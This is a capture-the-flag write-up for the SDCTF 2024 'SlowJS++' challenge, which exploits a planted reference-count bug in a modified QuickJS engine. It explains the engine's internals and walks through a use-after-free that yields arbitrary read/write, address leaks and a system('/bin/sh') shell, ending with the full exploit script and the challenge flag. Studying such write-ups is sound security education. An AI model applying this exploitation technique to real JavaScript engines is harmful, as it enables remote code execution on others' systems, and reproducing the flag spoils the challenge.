---
layout: post
title: "[SDCTF 2024] SlowJS++"
author: sinamhdv
---

**Summary**: Exploiting UAF due to an incorrect decrement to the reference count of an object in QuickJS Javascript engine to gain arbitrary read/write and leaks and then using that to gain RCE.

## Intro

SlowJS++ was a Javascript engine exploitation challenge in SDCTF 2024, with only 2 solves during the competition. I could not solve it before the end of the CTF, but I kept working on the exploit and I finally solved it about 10 hours after the end.

We were given the challenge binary, which was a recent version of QuickJS Javascript engine compiled with debug info, and told that it was being hosted on Ubuntu 23.10 in the remote environment. I downloaded the libc, libm, and ld for Ubuntu 23.10 and patched the binary to use those. The challenge also had a hint that said we should bindiff the `async_func_resume` function.

## QuickJS Internals

This challenge is about async functions and promises in Javascript. I found [this](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Introducing), [this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises), and [this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) very helpful in understanding the javascript concepts. Also, [this writeup](https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html) was particularly helpful in understanding a bit more about QuickJS internals.

### 1. JSValue

QuickJS represents `JSValue`s as two qwords. The first one is the value (in case of int/double/etc.) or the pointer (for heap objects), and the second qword is a tag that shows the type of the first qword. The tags can be found [here](https://github.com/bellard/quickjs/blob/d378a9f3a583cb787c390456e27276d0ee377d23/quickjs.h#L67). The negative tag values are for objects that are managed by the heap and the garbage collector. The zero and positive tags are for objects that are not allocated separately on the heap, and are represented with their direct value (such as int, double, undefined, etc.). You can look at the different structs used by QuickJS both by looking at the source code and by opening the challenge binary in gdb and using `ptype /ox <struct name>`.

### 2. JSString

The `JSString` struct represents a string, and it can be inspected with `ptype /ox JSString` in gdb:

```
type = struct JSString {
/* 0x0000      |  0x0004 */    JSRefCountHeader header;
/* 0x0004: 0x0 |  0x0004 */    uint32_t len : 31;
/* 0x0007: 0x7 |  0x0001 */    uint8_t is_wide_char : 1;
/* 0x0008: 0x0 |  0x0004 */    uint32_t hash : 30;
/* 0x000b: 0x6 |  0x0001 */    uint8_t atom_type : 2;
/* 0x000c      |  0x0004 */    uint32_t hash_next;
/* 0x0010      |  0x0000 */    union {
/*                0x0000 */        uint8_t str8[0];
/*                0x0000 */        uint16_t str16[0];
                                   /* total size (bytes):    0 */
                               } u;
                               /* total size (bytes):   16 */
                             }
```

Basically, there's some metadata, including the length of the string, in the first 16 bytes, and then from offset 16 the array of string bytes will start (`str8`). So, the content of the string is not stored in a separate buffer and is stored at the end of the `JSString` object itself.

### 3. JSObject

The `JSObject` struct represents a generic javascript object in memory. You can see that each object has a gc header, and the first dword of the header is the reference count for the garbage collector. Another important thing about objects is their `class_id`, which shows the type of that object. Different class id values can be seen [here](https://github.com/bellard/quickjs/blob/d378a9f3a583cb787c390456e27276d0ee377d23/quickjs.c#L118). `JSObject`s also have two fields called `shape` and `prop`. `shape` points to a `JSShape` struct that describes the shape of an object and the properties that it has (similar to a map in v8), and the `prop` field is a pointer to an array of `JSProperty` structs that each hold the data for one of the properties of our object.

Two important objects to learn about are `ArrayBuffer`s and `TypedArray`s:

- An `ArrayBuffer` object is a `JSObject` that has a pointer to a `JSArrayBuffer` struct instance in its `obj.u.array_buffer` field. The `JSArrayBuffer` struct has a pointer to its backing storage memory (the actual data buffer) called `data` and a few other fields like the length.

- A `TypedArray` is a kind of array that allows the user to use an array buffer's storage for different types. For example, a `Uint32Array` as a typed array that has an array buffer inside itself and uses that array buffer as an array of 32-bit integers. The important fields in a `JSObject` of a typed array are `obj.u.array.u1.typed_array`, `obj.u.array.u.ptr`, and `obj.u.array.count`. The `typed_array` field has a pointer to a `JSTypedArray` struct, which itself has a field called `obj` that points back at the `JSObject` of our typed array, and has another pointer called `buffer` that points to a `JSObject` representing the array buffer behind this typed array. the `ptr` and `count` fields in a typed array object represent the pointer to the backing storage of the array buffer behind this typed array (where the actual "data" is stored), and the length of the array. So, if `ta_obj` is the `JSObject` of our typed array, `ta_obj.u.array.u.ptr` and `ta_obj.u.array.u1.typed_array->buffer->u.array_buffer->data` both point to the backing storage memory of the array, but the first one is way more convenient so the `ptr` and `count` fields inside the typed array object itself are the ones that are used when accessing different indexes of the array. You can look at the source code of `JS_SetPropertyValue()` to see how this is done.

Another important thing to note about array buffers and typed arrays is that the `JSArrayBuffer` and `JSTypedArray` structs have `next` and `prev` fields inside their `struct list_head` fields that form a double-linked list. This double linked list will connect an array buffer with all typed arrays that use that array buffer as their storage buffer. The `js_array_buffer_finalizer` function
[here](https://github.com/bellard/quickjs/blob/d378a9f3a583cb787c390456e27276d0ee377d23/quickjs.c#L53109) has a for-each loop that when an array buffer gets freed, goes through all typed arrays that use this array buffer and sets the `count` field of those typed arrays to zero. So, the approach in the writeup I mentioned earlier for a TCTF 2021 challenge does not work any more, because if you cause a UAF for an array buffer, you can no longer use typed arrays previously connected to it to read/write memory from its freed backing storage, as the `count` field of those typed arrays gets set to zero.

## Debugging

A debugging approach that was mentioned in the TCTF writeup by r3kapig was to use `Math.min(obj)` and break on the `js_math_min_max` function in gdb, and then inspect the pointer at `*$r8` or `argv->u.ptr` after hitting the breakpoint to find the address of `obj`. I also used this approach for debugging and it was really helpful.

## Vulnerability

I downloaded the source for the latest version of QuickJS from https://github.com/bellard/quickjs/tree/d378a9f3a583cb787c390456e27276d0ee377d23 (this is the latest commit at the time of the CTF) and built an original QuickJS binary with debug info to achieve something similar to the challenge binary. Opening both binaries in Ghidra and comparing the `async_func_resume` function, you can see that the challenge binary will decrease the reference count on the object returned by an async function, and if that reference count reaches zero it will free the object with `__JS_FreeValueRT` (given that the object has a negative tag value, which means that it is managed by the gc). This is probably the inlined version of the `JS_FreeValueRT` function [here](https://github.com/bellard/quickjs/blob/d378a9f3a583cb787c390456e27276d0ee377d23/quickjs.h#L658), which does the same thing. So, an object that is returned from an async function gets its refcount decreased by 1 when it shouldn't have been decreased. So, if we can cause the refcount of an object to become zero and get the object freed while we still keep the reference to that object in our source, we can cause a UAF situation.

```C
lVar3 = *(long *)(param_2 + 0xa0);
uVar4 = *(undefined8 *)(lVar3 + -8);
piVar5 = *(int **)(lVar3 + -0x10);
*(undefined (*) [16])(lVar3 + -0x10) = (undefined  [16])0x0;
*(undefined8 *)(lVar3 + -8) = 3;
// if the object has a negative tag (heap object) and (--refcount <= 0):
if ((0xfffffff4 < (uint)uVar4) && (iVar1 = *piVar5, *piVar5 = iVar1 + -1, iVar1 + -1 < 1)) {
  __JS_FreeValueRT(*(undefined8 *)(param_1 + 0x18),piVar5);	// free the object
}
```

Using the `Math.min(obj)` debug approach to inspect the reference count of some objects after they're created, you can see that their reference count is 1 more than the expected value. For example, an object with only 1 reference to it has a refcount of 2. This is also something mentioned in the TCTF challenge writeup, and I don't understand the reason for this either. I also think this might be because of some additional internal reference to the object in the engine.

## Getting arbitrary read/write

I wrote an async function that returned the object `arr`, where `arr` is a globally-defined `Uint32Array`. I normally expected that after calling `fn1()` once and returning from it, `arr` is freed and the UAF is triggered. However, for some reason it appears that we need to call it twice to have `arr` get freed. I don't clearly understand the reason for this and found this with a bit of trial and error and playing around with the initial PoC code. Also, it appeared that if the first `Math.min(arr)` call (between the `fn1()` calls; the one marked with `// ???`) is not there, `arr` will not get freed somehow. However, when the exploit is completed, commenting that `Math.min` call did not break the exploit. I assume this might have something to do with the garbage collector being invoked at different times in these situations, but I don't understand this clearly either. The good thing is that although the garbage collector and the general heap layout of the application is not very predictable and causes weird issues like this, it is deterministic so it won't change between different runs of the same js code, and we can tweak some stuff to make the issues caused by them go away.

```js
var arr = new Uint32Array(0x140);
...
async function fn1() {
	console.log("fn1");
	return arr;
}
...
fn1().then(() => {
	Math.min(arr) // ???
	fn1().then(() => {
		Math.min(1);	// arr gets freed here, but we still have the reference to it.
	});
});
```

Now if we break after the second `fn1()` call, we can see that `arr` is freed and is in the malloc free lists. by inspecting the free lists (tcahce/fastbins) we can see that we need to allocate a few more objects to bring `arr`'s freed memory to the top of the free lists. We use a for loop to perform some allocations for this. All `JSObject` structs are allocated using 0x50-sized chunks, so allocating new objects on the heap will use the same free list as `arr`'s `JSObject` chunk:

```js
objs = [];
for (let i = 0; i < 6; i++) {
	objs.push({a: 1});
}
```

The for loop is allocating 6 new objects and pushing them into some array to keep their references and prevent them from being freed. However, the number of iterations of the loop (6) is not always the same and changes weirdly because of the side effects of other parts of the code on the heap layout and gc operations. I had to change this value from 6 to 7 and vice versa serveral times during the exploit development process. You just have to look at the heap tcahce/fastbins layout at the breakpoint before this code segment to determine the number of iterations of this loop.

Now we want to allocate another `Uint32Array`, but this time we want its `ptr` field (which points to the actual data storage memory for the array) to point to the same chunk of memory that used to hold the `JSObject` struct for `arr`. Therefore, since `JSObject` structs are allocated in 0x50-sized chunks, it is necessary that the data size of our new array causes the allocation of an 0x50-sized chunk. So, we want our array's data memory to have a size of 0x48, which means 18 4-byte integers. So, we will define `uaf_arr` as:

```js
uaf_arr = new Uint32Array(18);
```

The allocation of this new typed array causes 3 malloc calls that should return an 0x50-sized chunk. The first one is to host the `JSObject` of the `ArrayBuffer` behind this typed array. The second one is to host the backing storage memory of the array (the one that we want to collide with `arr`'s object struct), and the third one is for the `JSObject` of the typed array itself. So, we want `arr`'s freed memory to be the second chunk from the beginning of tcache before we instantiate `uaf_arr` to ensure that `uaf_arr`'s data pointer points to it. We need to adjust the number of allocated objects in the previous for loop to meet this requirement. We can do a `Math.min(uaf_arr)` right after this line to break and see if everything went as we wanted. `uaf_arr`'s data pointer (`ptr` field) must point to the same memory that hosted `arr`'s `JSObject` struct.

Now, we can write into `uaf_arr` and edit the object metadata of `arr` as we wish:

```js
// set fake object metadata for 'arr'
uaf_arr[0] = 10;		// large refcount to prevent it from being freed by the gc later
uaf_arr[1] = 0x001b0d00;	// class_id of Uint32Array and some flags similar to what uaf_arr has
uaf_arr[0x10] = 0x10000000;	// a huge length value (the .u.array.count field of JSObject)
```

Now we can point `arr`'s data pointer (`.u.array.u.ptr` field) to any arbitrary location by editing its value through `uaf_arr` and then read/write that location by accessing `arr[0]`. However, we don't have any kind of leak yet so we don't know what address to write there. The memory of `uaf_arr` is also zeroed out when its re-allocated, so we can't find any pointers there.

## Getting leaks

In order to get leaks I did the same thing that we did to `arr`, but this time to a string. If we can cause a `JSString` to be freed and then allocate a `Uint32Array` whose data pointer points to the `JSString` struct memory, we can manipulate the length of the `JSString` and set it to some huge value, and then we can have oob read on the heap through that string.

```js
var str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";	// a JSString that occupies an 0x50-sized chunk
...
async function fn2() {
	console.log("fn2");
	return str;
}
...
fn1().then({
	fn1().then({
		...
		// do stuff related to causing UAF for 'arr'
		...
		fn2().then({
			fn2().then({
				// 'str' gets freed here while we still have a reference to it.

				// allocate more objects to bring str's freed memory near the top of tcachebin
				for (let i = 0; i < 6; i++) {
					objs.push({a: 1});
				}

				// allocate a typed array with its data pointer pointing to str's freed memory (freed JSString struct)
				var uaf_str_arr = new Uint32Array(18);

				// set metadata of the JSString struct
				uaf_str_arr[0] = 2;	// large refcount to avoid it getting freed by gc
				uaf_str_arr[1] = 0x10000000;	// huge length
				uaf_str_arr[2] = 0x497f93b1;	// some metadata I copied from original 'str'
				uaf_str_arr[3] = 0x4b;			// some metadata I copied from original 'str'
				
				...
			});
		});
	});
});
```

This has the exact same process as exploiting `arr`. You just have to adjust the size of the initial content of `str` so that its `JSString` struct is allocated in an 0x50-sized chunk, so allocating `{a: 1}` objects will allocate from the same malloc freelist as it.

Now that we can read stuff from the heap, I wrote a helper function to read a dword from the heap:

```js
const read_dword = (offset) => {
	let result = 0;
	for (let i = 3; i >= 0; i--) {
		result = (result << 8) | str.charCodeAt(offset + i);
	}
	return result;
};
```

Then, I set a breakpoint and used `tel` gdb command to inspect the pointers that come after `str`'s buffer on the heap. I could find a pointer with a constant offset from libc base and another pointer with a constant offset from heap base. I used these to leak libc and heap base.

## Getting RCE

The `JSContext *ctx` that gets passed as the first argument to many js functions has a field named `rt` which is a pointer to `JSRuntime`. `JSRuntime` also has a field `JSMallocFunctions mf`, and another one `JSMallocState malloc_state`. `mf` has 4 function pointers, the first of which is `js_malloc`. Its signature shows that the first argument to it is a `JSMallocState *`. So, if we can overwrite the `ctx->rt->mf.js_malloc` function pointer with `system()` and we can write `"/bin/sh"` at `&(ctx->rt->malloc_state)`, we will be able to call `system("/bin/sh")` by triggering `js_malloc`. Just before doing that, I set the `shape` field of `arr`'s object metadata to point to the middle of some area near the base of the heap that seemed to contain just zero. This will prevent segfaults in an inline function `find_own_property` called by `JS_SetPropertyInternal`, which is the function used for writing to an index of `arr`. In the end, allocating any object will trigger `js_malloc` and give us a shell. This is the final part of the exploit:

```js
// leak the heap base low and high dwords by reading them from the heap
let heap_base_high = read_dword(0x54);
let heap_base_low = read_dword(0x50) - 0xd60;
console.log(heap_base_high.toString(16));
console.log(heap_base_low.toString(16));

// set the 'shape' property of 'arr' to the middle of an area with zeros.
// this will prevent segfaults in find_own_property which is an inlined function called
// by JS_SetPropertyInternal when performing writes to an index of arr
uaf_arr[6] = heap_base_low + 0x200;
uaf_arr[7] = heap_base_high;

// set the data pointer of arr to point to the heap base
uaf_arr[0xe] = heap_base_low;
uaf_arr[0xf] = heap_base_high;

// leak (main_arena+96), which is a libc address, by reading it off the heap
let libc_leak_low = read_dword(0x100);
let libc_leak_high = read_dword(0x104);
console.log(libc_leak_high.toString(16));
console.log(libc_leak_low.toString(16));

// Math.min(uaf_arr);

// set ctx->rt->mf->js_malloc to system()
arr[0xa8] = libc_leak_low - 0x1a9a50;	// libc-dependant offset
arr[0xa9] = libc_leak_high;

// write "/bin/sh\0" at ctx->rt->malloc_state's location, which gets passed to js_malloc as the first argument
arr[0xb0] = 0x6e69622f;
arr[0xb1] = 0x0068732f;

// trigger js_malloc, which will now do system("/bin/sh")
var x = {a: 1};
```

Something that I've just found out at the time of writing this writeup and commenting my exploit is that even writing too many comments in the exploit code can mess up the heap layout and make the exploit not work. This is probably expected because the JS source code seemed to get allocated on the heap as well, so changing the source code size too much might have effects on the heap layout and break the exploit. Basically, it's very fragile but at least it's deterministic :)

## Full exploit

And the full final exploit code:

```js
var arr = new Uint32Array(0x140);
var str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";
var uaf_arr;
var objs;

async function fn1() {
	console.log("fn1");
	return arr;
}

async function fn2() {
	console.log("fn2");
	return str;
}

fn1().then(() => {
	fn1().then(() => {
		objs = [];
		for (let i = 0; i < 6; i++) {
			objs.push({a: 1});
		}

		uaf_arr = new Uint32Array(18);

		uaf_arr[0] = 10;
		uaf_arr[1] = 0x001b0d00;
		uaf_arr[0x10] = 0x10000000;

		fn2().then(() => {
			fn2().then(() => {
				for (let i = 0; i < 6; i++) {
					objs.push({a: 1});
				}

				var uaf_str_arr = new Uint32Array(18);

				uaf_str_arr[0] = 2;
				uaf_str_arr[1] = 0x10000000;
				uaf_str_arr[2] = 0x497f93b1;
				uaf_str_arr[3] = 0x4b;

				const read_dword = (offset) => {
					let result = 0;
					for (let i = 3; i >= 0; i--) {
						result = (result << 8) | str.charCodeAt(offset + i);
					}
					return result;
				};

				let heap_base_high = read_dword(0x54);
				let heap_base_low = read_dword(0x50) - 0xd60;
				console.log(heap_base_high.toString(16));
				console.log(heap_base_low.toString(16));

				uaf_arr[6] = heap_base_low + 0x200;
				uaf_arr[7] = heap_base_high;

				uaf_arr[0xe] = heap_base_low;
				uaf_arr[0xf] = heap_base_high;

				let libc_leak_low = read_dword(0x100);
				let libc_leak_high = read_dword(0x104);
				console.log(libc_leak_high.toString(16));
				console.log(libc_leak_low.toString(16));

				arr[0xa8] = libc_leak_low - 0x1a9a50;
				arr[0xa9] = libc_leak_high;

				arr[0xb0] = 0x6e69622f;
				arr[0xb1] = 0x0068732f;

				var x = {a: 1};
			});
		});
	});
});
```

The flag: `sdctf{i_PrOMlse_7heRe_1S_n0_UniN7end3D_SOlu7i0n_tHl5_tImE}`
